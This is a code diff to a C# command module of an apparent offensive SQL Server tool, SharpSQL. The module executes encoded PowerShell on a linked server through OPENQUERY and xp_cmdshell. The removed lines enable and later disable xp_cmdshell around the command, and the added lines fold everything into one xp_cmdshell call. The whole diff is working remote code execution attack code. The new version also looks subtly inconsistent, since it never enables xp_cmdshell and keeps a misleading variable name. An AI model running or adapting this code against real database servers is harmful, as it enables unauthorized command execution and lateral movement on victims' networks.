@@ -106,34 +106,13 @@ namespace SharpSQL.Commands
                 Environment.Exit(0);
             }
 
-            string enableAdvOptions = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'SELECT 1; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;')";
+            string enableAdvOptions = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'SELECT 1; EXEC {database}..xp_cmdshell \"powershell -enc {cmd}\"')";
             SqlCommand command = new SqlCommand(enableAdvOptions, connection);
             SqlDataReader reader = command.ExecuteReader();
             reader.Read();
-            Console.WriteLine("\n[*] Enabling Advanced options..");
-            reader.Close();
-
-            string enableXP = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'SELECT 1; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;')";
-            command = new SqlCommand(enableXP, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            Console.WriteLine("[*] Enabling xp_cmdshell..");
-            reader.Close();
-
-            string execCmd = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'SELECT 1; EXEC xp_cmdshell ''powershell -enc {cmd}'';')";
-            command = new SqlCommand(execCmd, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            Console.WriteLine($"[*] Executing command on {target}..");
-            Console.WriteLine("[+] Command result: " + reader[0]);
-            reader.Close();
-
-            string disableXP = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'SELECT 1; EXEC sp_configure ''xp_cmdshell'', 0; RECONFIGURE;')";
-            command = new SqlCommand(disableXP, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            Console.WriteLine("[*] Disabling xp_cmdshell..");
-            reader.Close();
+			Console.WriteLine($"[*] Executing command on {target}..");
+			Console.WriteLine("[+] Command result: " + reader[0]);
+			reader.Close();
 
             connection.Close();
         }
